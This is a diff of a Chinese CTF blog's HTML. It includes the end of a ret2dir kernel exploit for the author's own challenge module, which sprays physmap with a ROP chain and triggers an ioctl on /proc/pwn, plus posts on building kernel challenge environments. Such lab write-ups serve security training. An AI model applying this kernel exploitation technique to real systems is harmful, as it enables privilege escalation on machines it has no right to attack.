class="number">0</span>;</span><br><span class="line">        page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line"></span><br><span class="line">        physmap_spray_arr[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        write_rop_chain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">12000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                physmap_spray_arr[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (!physmap_spray_arr[i])</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;oom\n&quot;</span>);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="number">0</span>], page_size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger physmap one_gadget...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        try_hit = <span class="number">0xffff888000000000</span> +  <span class="number">0x4000f00</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> rop[<span class="number">24</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> fd=open(<span class="string">&quot;/proc/pwn&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        ioctl(fd,<span class="number">0</span>,try_hit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>其实rop可以优雅一些的。分段滑，不过还是粗暴地try_hit页尾了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://zt20xx.github.io/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-ret2dir/" data-id="cm48n2it600068n7o2i9n2nw4" data-title="kernel-出题-ret2dir" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-kernel/kernel-出题-pte_pud重叠" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-kernel/kernel-出题-pte_pud重叠" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-pte_pud%E9%87%8D%E5%8F%A0/" class="article-date">
   <time class="dt-published" datetime="2024-11-26T15:16:18.000Z" itemprop="datePublished">2024-11-26</time>
@@ -322,8 +85,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-pte_pud%E9%87%8D%E5%8F%A0/">kernel-出题-pte_pud重叠</a>
+    <h1 class="p-name article-title" itemprop="headline name">
+      kernel-出题-pte_pud重叠
     </h1>
   
 
@@ -372,216 +135,29 @@
     </footer>
   </div>
   
-</article>
-
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-kernel/kernel-出题-序" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/11/25/kernel/kernel-%E5%87%BA%E9%A2%98-%E5%BA%8F/" class="article-date">
-  <time class="dt-published" datetime="2024-11-25T14:34:10.000Z" itemprop="datePublished">2024-11-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+    <a href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-ret2dir/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/11/25/kernel/kernel-%E5%87%BA%E9%A2%98-%E5%BA%8F/">kernel-出题-序</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>先等请求合并吧，现在先随便写写</p>
-<p>1.不使用内核地址（内核rop工具都有些小问题，资源消耗大，kaslr下异常），使用内核驱动的地址作为rop<br>2.使用busybox，不使用debootstrap（或者用一个例子）</p>
-<p>新功能介绍</p>
-<p>内核基本选项</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make defconfig</span><br><span class="line">make -j`<span class="built_in">nproc</span>` bzImage</span><br></pre></td></tr></table></figure>
-
-<p>启动，以check为例<br>其目录结构如下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">check</span><br><span class="line">├── Makefile</span><br><span class="line">└── src</span><br><span class="line">    ├── exp.c</span><br><span class="line">    └── pwn.c</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>先进入check目录，输入make，完成config初始化，编译然后运行，完成后其目录结构如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">└─$ tree -L 2</span><br><span class="line">.</span><br><span class="line">├── config</span><br><span class="line">├── Makefile</span><br><span class="line">├── qemu</span><br><span class="line">│   ├── initrd</span><br><span class="line">│   ├── initrd.img</span><br><span class="line">│   └── Makefile</span><br><span class="line">└── src</span><br><span class="line">    ├── exp</span><br><span class="line">    ├── exp.c</span><br><span class="line">    ├── Makefile</span><br><span class="line">    ├── modules.order</span><br><span class="line">    ├── Module.symvers</span><br><span class="line">    ├── pwn.c</span><br><span class="line">    ├── pwn.ko</span><br><span class="line">    ├── pwn.mod.c</span><br><span class="line">    ├── pwn.mod.o</span><br><span class="line">    └── pwn.o</span><br></pre></td></tr></table></figure>
-
-<p>现在默认使用的内核版本是linux-4.19.324，可以通过修改config文件进行修改</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://zt20xx.github.io/2024/11/25/kernel/kernel-%E5%87%BA%E9%A2%98-%E5%BA%8F/" data-id="cm3x5v3kg0000hz7o2052fn3c" data-title="kernel-出题-序" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-pwn-出题-序" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/11/25/pwn-%E5%87%BA%E9%A2%98-%E5%BA%8F/" class="article-date">
-  <time class="dt-published" datetime="2024-11-25T14:28:30.000Z" itemprop="datePublished">2024-11-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+          kernel-出题-ret2dir
         
+      </div>
+    </a>
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/11/25/pwn-%E5%87%BA%E9%A2%98-%E5%BA%8F/">pwn-出题-序</a>
-    </h1>
   
+    <a href="/2024/11/25/kernel/kernel-%E5%87%BA%E9%A2%98-%E5%BA%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">kernel-出题-序</div>
+    </a>
+  
+</nav>
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>1.不手动指定任何固定的地址<br>2.在高版本下编译后依旧可以使用</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://zt20xx.github.io/2024/11/25/pwn-%E5%87%BA%E9%A2%98-%E5%BA%8F/" data-id="cm3x4pg3l0000z97o6ow18fqh" data-title="pwn-出题-序" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
-
-    </footer>
-  </div>
   
 </article>
 
-
-
-  
-    <article id="post-misc/windows" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/11/16/misc/windows/" class="article-date">
-  <time class="dt-published" datetime="2024-11-16T12:13:09.000Z" itemprop="datePublished">2024-11-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/11/16/misc/windows/">windows</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <table>
-<thead>
-<tr>
-<th>设置</th>
-<th>快捷键</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>windows实时字幕</td>
-<td>win ctrl l</td>
-</tr>
-<tr>
-<td>PowerToys 设置</td>
-<td></td>
-</tr>
-<tr>
-<td>键盘映射</td>
-<td>caps lock -&gt; esc</td>
-</tr>
-<tr>
-<td>ocr</td>
-<td>win shift t</td>
-</tr>
-<tr>
-<td>颜色选取</td>
-<td>win shift c</td>
-</tr>
-</tbody></table>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://zt20xx.github.io/2024/11/16/misc/windows/" data-id="cm3x49drm0005iy7o3hvb58w3" data-title="windows" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-wslg" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/10/24/wslg/" class="article-date">
-  <time class="dt-published" datetime="2024-10-24T14:05:03.000Z" itemprop="datePublished">2024-10-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/10/24/wslg/">tmp</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>kali的图像界面总出问题，也不记得改过什么设置了，转debian试试</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://zt20xx.github.io/2024/10/24/wslg/" data-id="cm48n2it200008n7obf2oenx2" data-title="tmp" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-  <nav id="page-nav">
-    
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
-  </nav>
 
 </section>
         
